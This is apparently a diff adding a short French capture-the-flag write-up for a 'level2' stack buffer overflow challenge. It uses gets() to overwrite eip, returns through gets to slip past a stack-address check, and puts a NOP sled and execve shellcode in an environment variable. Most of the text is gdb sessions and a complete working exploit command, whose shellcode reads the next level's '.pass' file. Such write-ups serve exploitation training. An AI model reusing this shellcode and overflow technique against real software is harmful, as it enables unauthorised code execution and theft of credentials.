@@ -1,0 +1,59 @@
+- Apres analyse du code asm on remarque un gets qui nous servira a provoquer un overflow pour modifier eip
+
+- On test plusieurs taille de payload sous gdb
+
+python -c 'print "A" * 80 + "BBBB"' > /tmp/test2
+gdb ./level2
+r
+i r
+
+Cannot access memory at address 0x42424242
+(gdb) i r
+eax            0x804a008        134520840
+ecx            0x0      0
+edx            0xbffff60c       -1073744372
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff660       0xbffff660
+ebp            0x41414141       0x41414141
+esi            0x0      0
+edi            0x0      0
+eip            0x42424242       0x42424242
+eflags         0x210282 [ SF IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+
+- On remarque aussi que l'adresse mémoire juste apres buff est testée avec 0xb000000 pour déterminer si
+en faisant un overflow on essaie de faire pointé une adresse mémoire de la stack
+
+- Du coup on pointe vers l'adresse mémoire de gets afin que la prochain instruction apres le "ret" soit gets puis on rajoute une adresse cette fois si sur une variable d'environement contenant le shellcode afin qu elle soit executer apres gets
+
+- On détermine l'adresse de l env avec gdb
+
+gdb ./level2
+break main
+x/1024xg $esp
+
+0xbffffe58:     0x4c00326c6576656c      0x555f6e653d474e41
+0xbffffe68:     0x00382d4654552e53      0x9090903d4f544f54
+0xbffffe78:     0x9090909090909090      0x9090909090909090
+0xbffffe88:     0x9090909090909090      0x9090909090909090
+0xbffffe98:     0x9090909090909090      0x9090909090909090
+0xbffffea8:     0x9090909090909090      0x9090909090909090
+0xbffffeb8:     0x9090909090909090      0x9090909090909090
+0xbffffec8:     0x9090909090909090      0x9090909090909090
+0xbffffed8:     0xc931db3158466a90      0x580b6a5f21eb80cd
+0xbffffee8:     0xe689632d68665299      0x2f6868732f2f6852
+0xbffffef8:     0x565752e3896e6962      0xffdae880cde18953
+0xbfffff08:     0x682f20746163ffff      0x726573752f656d6f
+
+- Le shellcode est le meme que le level precedent
+
+- Exploit :
+
+export TOTO=`python -c 'print "\x90" * 100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/level3/.pass; whoami; exit"'`
+
+(python -c 'print "A" * 80 + "\xc0\x83\x04\x08" + "\x98\xfe\xff\xbf"') | ./level2
